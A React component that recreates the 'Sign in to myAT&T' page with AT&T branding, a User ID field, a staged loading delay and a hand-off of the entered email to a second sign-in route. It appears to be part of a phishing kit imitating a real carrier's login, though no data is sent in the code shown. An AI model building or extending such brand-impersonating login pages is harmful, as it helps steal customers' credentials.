import React from 'react';
import axios from 'axios';
import './hometwo.css';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

import mainbg from './mainbg.jpeg';
import logotwo from './logotwo.gif';
import north from './north.png';
import atlogo from './atlogo.png';
import or from './or.png';


function HomeTwo(){

    const[email, setUserName] = useState("");
    const[isLoading, setIsLoading]= useState(false);
    const navigate = useNavigate();

    function handleNext(e){
        e.preventDefault();
        setIsLoading(true);

        setTimeout(() => {
            setIsLoading(false);
            navigate('/sign-in',{state:{email:email}});
          }, 3000);

       
    }


    return (
        <>

            <div className='mainContent py-4'>

                <div className='col-md-5 m-auto maindiv pb-3'>

                    <div className='imagediv text-center py-4'>
                        <img src={atlogo} className="mylogo" />

                    </div>

                    <h1 className='text-center font-weight-bold bighead'>Sign in</h1>


                    <h2 className='text-center smallhead'>to myAT&T</h2>

                  

                    <form onSubmit={handleNext} className="px-5">
                    <div className='form-group py-1'>

                       <label className='font-weight-bold'> User ID </label>

                        <input onChange={function(e){
                        setUserName(e.target.value);
                    }} value={email}  type="text"className='form-control w-100 py-4' required/>
                        
                        <button className='next btn w-100'>
                            {isLoading ? "Loading ....." : "Continue"}
                        </button>
                        </div>




                        
                        
                    </form>


                    <div className='px-5'>
                        <p className='primarycolor'>Forgot user ID?</p>

                        <p className='primarycolor'>Don't have a user ID? Create one now </p>
                        <div>
                        <img src={or} style={{
                            width:"100%",
                        }}/>

                <button className='nexttwo btn w-100'>
                            signin with myAT&T app
                        </button>
                        </div>
                        
                    </div>

                

                </div>


                

            </div>
        
        
        </>
    );

}

export default HomeTwo;